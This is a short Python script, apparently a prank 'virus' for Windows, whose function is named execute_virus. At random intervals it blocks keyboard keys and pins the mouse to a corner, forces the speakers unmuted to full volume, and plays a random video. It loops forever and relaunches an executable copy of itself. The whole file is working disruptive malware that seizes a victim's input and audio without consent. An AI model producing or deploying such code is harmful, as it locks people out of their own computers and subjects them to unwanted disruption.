import os
import glob
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import cv2
from ffpyplayer.player import MediaPlayer
import threading
import keyboard
from pynput.mouse import Controller
import random
from time import sleep

os.add_dll_directory(os.getcwd())


def maximizeAudio():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(0.0, None)


def blockinput():
    global block_input_flag
    block_input_flag = 1
    t1 = threading.Thread(target=blockinput_start)
    t1.start()


def unblockinput():
    blockinput_stop()


def blockinput_start():
    mouse = Controller()
    global block_input_flag
    for i in range(150):
        keyboard.block_key(i)
    while block_input_flag == 1:
        mouse.position = (0, 0)


def blockinput_stop():
    global block_input_flag
    for i in range(150):
        keyboard.unblock_key(i)
    block_input_flag = 0


def triggerVideo(video_path):
    video=cv2.VideoCapture(video_path)
    video.get(cv2.CAP_PROP_FPS)
    player = MediaPlayer(video_path)
    while True:
        grabbed, frame=video.read()
        player.get_frame()
        if not grabbed:
            break
        if cv2.waitKey(28) & 0xFF == ord("h"):
            break
        cv2.imshow(":D", frame)
    video.release()
    cv2.destroyAllWindows()


def execute_virus():
    mylist = [f for f in glob.glob("media/*.mp4")]
    sleep(random.randint(0, 700))
    blockinput()
    p = mylist[random.randint(0, len(mylist)-1)]
    maximizeAudio()
    triggerVideo(p)
    unblockinput()


def main():
    while True:
        execute_virus()
        os.startfile(__file__[:-2]+'exe')


if __name__ == "__main__":
    main()
